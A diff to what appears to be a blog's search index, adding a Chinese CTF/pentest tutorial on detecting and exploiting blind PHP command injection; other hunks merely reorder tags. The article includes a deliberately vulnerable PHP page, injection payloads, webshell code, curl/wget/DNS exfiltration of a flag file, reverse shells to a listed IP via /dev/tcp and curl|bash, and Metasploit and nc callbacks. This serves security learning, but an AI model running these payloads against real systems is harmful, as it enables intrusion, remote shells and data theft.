@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>浅谈PHP无回显命令执行的利用</title>
+      <link href="/2020/08/18/%E6%B5%85%E8%B0%88PHP%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%88%A9%E7%94%A8/"/>
+      <url>/2020/08/18/%E6%B5%85%E8%B0%88PHP%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%88%A9%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<p><strong>本文首发于先知社区</strong></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CTF题或在一些渗透测试中往往会遇到没有回显的命令执行漏洞，为了能更好的实现对无回显命令执行漏洞的利用，我对此进行了简单总结。</p><h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><p>命令执行可能会存在命令执行但没有回显，所以首先要判断命令是否有执行。确定命令可以执行，然后就可以进行无回显命令执行的利用了。</p><h4 id="1、审计代码"><a href="#1、审计代码" class="headerlink" title="1、审计代码"></a>1、审计代码</h4><p>审计代码，根据代码逻辑判断(这个就需要扎实的审计代码能力的功底了)</p><h4 id="2、利用延时"><a href="#2、利用延时" class="headerlink" title="2、利用延时"></a>2、利用延时</h4><pre><code class="shell">ip=|sleep 5</code></pre><p>如果执行后延时5秒，就证明测试点存在命令执行漏洞</p><h4 id="3、HTTP请求"><a href="#3、HTTP请求" class="headerlink" title="3、HTTP请求"></a>3、HTTP请求</h4><blockquote><p>注意：ping命令不会产生http请求</p></blockquote><p><strong>1.在公网服务器监听监听端口</strong></p><pre><code class="shell">nc -lp 4444</code></pre><p><strong>2.向目标服务器发起http请求，执行curl命令</strong></p><pre><code class="shell">ip=|curl ip:4444</code></pre><p>如果向目标服务器发起http请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞。</p><h4 id="4、DNS请求"><a href="#4、DNS请求" class="headerlink" title="4、DNS请求"></a>4、DNS请求</h4><blockquote><p>如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。（要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现）  来源：安全脉搏</p></blockquote><p>（1）首先去<code>ceye.io</code>注册个账号，注册完后会给一个域名<br><img src="http://img-blog.csdnimg.cn/20200807002925899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我注册后给的域名是<code>v4utm7.ceye.io</code><br>（2）如果有域名解析请求就会被记录。访问<code>qwzf.v4utm7.ceye.io</code>，那么就会记录下来这个域名解析请求。<br><img src="http://img-blog.csdnimg.cn/20200807003433591.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200807003600192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>简单测试一下向目标服务器发起http请求，执行下面的命令</p><pre><code class="shell">ip=|curl `whoami`.v4utm7.ceye.io</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808025907696.png" alt="在这里插入图片描述"><br>查看dnslog<br><img src="http://img-blog.csdnimg.cn/20200808030031819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>若果得到执行结果(如上面执行<code>whoami</code>命令，得到<code>www-data</code>)，就说明测试点存在命令执行。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>了解了无回显命令执行的判断方法后，当然是还需要了解学习一下无回显命令执行的利用方法。<br>但测试利用方法之前，首先要准备一下环境。于是我写出下面的测试代码进行利用测试：<br><code>index.php</code></p><pre><code class="php">&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);include(&quot;flag.php&quot;);$ip=$_REQUEST[&#39;ip&#39;];if($ip){    shell_exec(&quot;ping -c 4 &quot;.$ip);}?&gt;</code></pre><h4 id="1、执行命令"><a href="#1、执行命令" class="headerlink" title="1、执行命令"></a>1、执行命令</h4><blockquote><p>利用条件：需要站点目录具有写权限</p></blockquote><p>通过执行命令，直接将php文件写入到在浏览器可直接读取的文件类型中(如txt文件)，然后访问txt文件即可得到php文件内容<br><strong>1.使用<code>&gt;</code>或<code>&gt;&gt;</code></strong></p><pre><code class="shell">cat flag.php &gt; flag.txtcat flag.php &gt;&gt; flag.txt</code></pre><p><img src="http://img-blog.csdnimg.cn/20200807021916734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200807022040888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.使用<code>cp</code>命令</strong></p><pre><code class="shell">cp flag.php flag.txt</code></pre><p><strong>3.使用<code>mv</code>命令</strong></p><pre><code class="shell">mv flag.php flag.txt</code></pre><p>通过执行tar命令和zip命令打包或压缩php文件，在浏览器上下载打包或压缩文件解压得到php文件内容<br>（1）tar打包或tar打包并压缩</p><pre><code class="shell">tar cvf flag.tar flag.phptar zcvf flag.tar.gz flag.php#解打包并解压缩：tar zxvf flag.tar.gz</code></pre><p><img src="http://img-blog.csdnimg.cn/20200807022625521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解打包得到flag：<br><img src="http://img-blog.csdnimg.cn/20200807022827507.png" alt="在这里插入图片描述"><br>（2）zip压缩</p><pre><code class="shell">zip flag.zip flag.php#解压缩：unzip flag.zip</code></pre><p>等等。</p><h4 id="2、写webshell-直接写入或外部下载webshell"><a href="#2、写webshell-直接写入或外部下载webshell" class="headerlink" title="2、写webshell(直接写入或外部下载webshell)"></a>2、写webshell(直接写入或外部下载webshell)</h4><blockquote><p>利用条件：需要站点目录具有写权限</p></blockquote><p><strong>1.写webshell</strong></p><pre><code class="shell">echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.phpecho &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php</code></pre><p><strong>2.外部下载shell</strong></p><blockquote><p>利用条件：目标服务器可以连接外网或可以与攻击机互通，且能执行wget命令</p></blockquote><pre><code class="shell">wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名</code></pre><p>利用命令执行写webshell或外部下载webshell后，用蚁剑连接测试，发现成功<br><img src="http://img-blog.csdnimg.cn/20200807033059749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后在蚁剑里直接查看flag.php文件，即可得到flag。</p><h4 id="3、在vps上建立记录脚本"><a href="#3、在vps上建立记录脚本" class="headerlink" title="3、在vps上建立记录脚本"></a>3、在vps上建立记录脚本</h4><blockquote><p>利用条件：需要目标服务器可以向公网服务器发起http请求，并且能执行curl命令或wget命令</p></blockquote><p><strong>1.构造记录脚本</strong><br>在自己的公网服务器站点根目录写入php文件，内容如下：<br><code>record.php</code></p><pre><code class="shell">&lt;?php$data =$_GET[&#39;data&#39;];$f = fopen(&quot;flag.txt&quot;, &quot;w&quot;);fwrite($f,$data);fclose($f);?&gt;</code></pre><p><strong>2.构造请求</strong><br>在目标服务器的测试点可以发送下面其中任意一条请求进行测试</p><pre><code class="php">curl http://*.*.*.**/record.php?data=`cat flag.php`wget http://*.*.*.*/record.php?data=`cat flag.php`</code></pre><p><strong>3.测试</strong><br><img src="http://img-blog.csdnimg.cn/20200809005535400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>执行命令后发现在公网服务器得到的<code>flag.txt</code>文件中，只得到下面内容，并未得到flag<br><img src="http://img-blog.csdnimg.cn/20200809004839426.png" alt="在这里插入图片描述"><br>于是考虑对命令执行的结果进行编码后写入<code>flag.txt</code>文件</p><pre><code class="shell">curl http://*.*.*.**/record.php?data=`cat flag.php|base64`wget http://*.*.*.*/record.php?data=`cat flag.php|base64`</code></pre><p>最终得到<br><img src="http://img-blog.csdnimg.cn/20200809005329589.png" alt="在这里插入图片描述"><br>Base64解码即可得到flag。</p><h4 id="4、通过dnslog带出数据"><a href="#4、通过dnslog带出数据" class="headerlink" title="4、通过dnslog带出数据"></a>4、通过dnslog带出数据</h4><blockquote><p>（1）命令执行时要避免空格，空格会导致空格后面的命令执行不到；<br>（2）将读取的文件命令用反引号``包含起来；<br>（3）拼接的域名有长度限制。</p></blockquote><p>利用命令：</p><pre><code class="shell">curl `命令`.域名</code></pre><p>测试一下命令</p><pre><code class="shell">#用&lt;替换读取文件中的空格，且对输出结果base64编码curl `cat&lt;flag.php|base64`#拼接域名(最终构造结果)curl `cat&lt;flag.php|base64`.v4utm7.ceye.io#另一种方法(不过有的环境下不可以)`cat flag.php|sed s/[[:space:]]//g`.v4utm7.ceye.io</code></pre><p><img src="http://img-blog.csdnimg.cn/20200807233034693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用dnslog，查看文件内容(flag.php文件内容)<br><img src="http://img-blog.csdnimg.cn/20200807233142132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码得到flag<br><img src="http://img-blog.csdnimg.cn/20200807233459278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="5、反弹shell"><a href="#5、反弹shell" class="headerlink" title="5、反弹shell"></a>5、反弹shell</h4><blockquote><p>利用条件：目标服务器可以向可通信的公网服务器发起http请求</p></blockquote><blockquote><p>1.服务器端执行<br>nc -vv -lp 8888<br>2.命令执行处执行<br>bash -i &gt;&amp; /dev/tcp/47.95.206.199/8888 0&gt;&amp;1<br>3.payload<br>ip=127.0.0.1%0d%0abash+-i+&gt;%26+/dev/tcp/47.95.206.199/8888+0&gt;%261<br>注意：百度搜索到的基本上都是上边这个方法，但经过测试并未成功。于是想到以前见过的一种方法</p></blockquote><pre><code class="shell">#1.首先在公网服务器使用nc命令监听端口nc -lvp 4444 #或nc -vv -lp 4444#2.然后在公网服务器上写一个文件(我写入到qwzf文件)，内容是下面命令bash -i &gt;&amp; /dev/tcp/x.x.x.165/4444 0&gt;&amp;1#3.最终浏览器上执行的payload(实际上就是在目标机执行curl x.x.x.165:8002/qwzf|bash)ip=|curl x.x.x.165:8002/qwzf|bash</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808010020913.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200808001336169.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200808010806598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="6、msf反向回连"><a href="#6、msf反向回连" class="headerlink" title="6、msf反向回连"></a>6、msf反向回连</h4><blockquote><p>利用条件：目标服务器可以向可通信的公网服务器发起http请求</p></blockquote><p><strong>1.远程服务器用msf监听：</strong></p><pre><code class="shell">use exploit/multi/handlerset payload linux/armle/shell/reverse_tcpset lport 4444set lhost xxx.xxx.xxx.xxxset exitonsession falseexploit -j</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808014306136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.目标服务器执行下面命令</strong></p><pre><code class="shell">ip=|bash -i &gt;&amp; /dev/tcp/xxxxx(vps公网ip)/4444 0&gt;&amp;1#如果上面这条命令在浏览器上执行失败。那么要将上面这条命令写入公网服务器上的一个文件中，在msf开始监听后，在测试点执行下面命令ip=|curl x.x.x.165:8002/qwzf|bash</code></pre><p><strong>3.公网服务器接收shell</strong><br>目标服务器上执行命令后，会在公网服务器上接收到，然后在公网服务器上执行以下命令getshell</p><pre><code class="shell">sessions -i 1shell</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808014758936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后<code>cat flag.php</code>得到flag。</p><h4 id="7、使用nc"><a href="#7、使用nc" class="headerlink" title="7、使用nc"></a>7、使用nc</h4><blockquote><p>利用条件：要求目标服务器也有nc工具</p></blockquote><pre><code class="shell">#1.公网服务器监听4444端口nc -tlp 4444#2.目标服务器执行如下命令ip=|nc -t x.x.x.165 4444 &lt; flag.php-u参数调整为udp,当tcp不能使用的时候使用#1.公网服务器监听4444端口nc -ulp 4444#2.目标服务器执行如下命令ip=|nc -u x.x.x.165 4444 &lt; flag.php</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808005738442.png" alt="在这里插入图片描述"></p><h4 id="8、curl上传文件读取源码"><a href="#8、curl上传文件读取源码" class="headerlink" title="8、curl上传文件读取源码"></a>8、curl上传文件读取源码</h4><blockquote><p>利用条件：目标服务器curl命令可以正常执行</p></blockquote><blockquote><p>使用<code>curl -F</code>将flag文件上传到Burp的Collaborator Client(Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies)</p></blockquote><p><strong>1.获取<code>Collaborator Client</code>分配给Burp的链接</strong></p><pre><code class="shell">打开Burp主界面 -&gt; 菜单（Burp）-&gt; Collaboraor Client -&gt; 点击Copy to Clipboard</code></pre><p><img src="http://img-blog.csdnimg.cn/20200808020335220.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200808020402436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Copy得到</p><pre><code class="shell">jyla6p5cfepdojez34stnodch3ntbi.burpcollaborator.net</code></pre><p><strong>2.拼接payload并在命令执行处提交</strong></p><pre><code class="shell">ip=|curl -X POST -F xx=@flag.php http://jyla6p5cfepdojez34stnodch3ntbi.burpcollaborator.net</code></pre><p><strong>3.查看Collaborator Client收到的数据</strong><br><img src="http://img-blog.csdnimg.cn/20200808020956879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功得到flag。</p><h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p>学习过程中，发现参考资料个别地方存在一些小错误(估计是测试环境不同导致的)，并且有些地方不太完善。于是，自己通过测试和分析后，总结了这篇文章，希望能更好的学习无回显命令执行的利用。</p><p>参考博客：<br><a href="https://www.cnblogs.com/hello-py/articles/13385679.html" target="_blank" rel="noopener">命令执行没有回显利用</a><br><a href="http://www.admintony.com/%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">无回显代码执行利用方法</a><br><a href="https://www.secpulse.com/archives/115970.html" target="_blank" rel="noopener">命令执行无回显的判断方法及dnslog相关例题</a><br><a href="http://blog.merl1ng.cc/2018/03/02/dnslog%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">dnslog利用</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞原理 </category>
+          
+          <category> 命令注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 命令执行 </tag>
+            
+            <tag> 无回显命令执行 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>命令执行绕过的练习(一)</title>
       <link href="/2020/08/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%9A%84%E7%BB%83%E4%B9%A0(%E4%B8%80)/"/>
       <url>/2020/08/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%9A%84%E7%BB%83%E4%B9%A0(%E4%B8%80)/</url>
@@ -566,9 +595,9 @@
       
         <tags>
             
-            <tag> 攻击类型 </tag>
-            
             <tag> 靶场练习 </tag>
+            
+            <tag> 攻击类型 </tag>
             
         </tags>
       
@@ -1538,11 +1567,11 @@
       
         <tags>
             
-            <tag> 靶场练习 </tag>
-            
             <tag> 导出文件注入 </tag>
             
             <tag> GET型盲注 </tag>
+            
+            <tag> 靶场练习 </tag>
             
         </tags>
       
@@ -1944,9 +1973,9 @@
       
         <tags>
             
-            <tag> XSS基础 </tag>
-            
             <tag> XSS绕过 </tag>
+            
+            <tag> XSS基础 </tag>
             
         </tags>
       
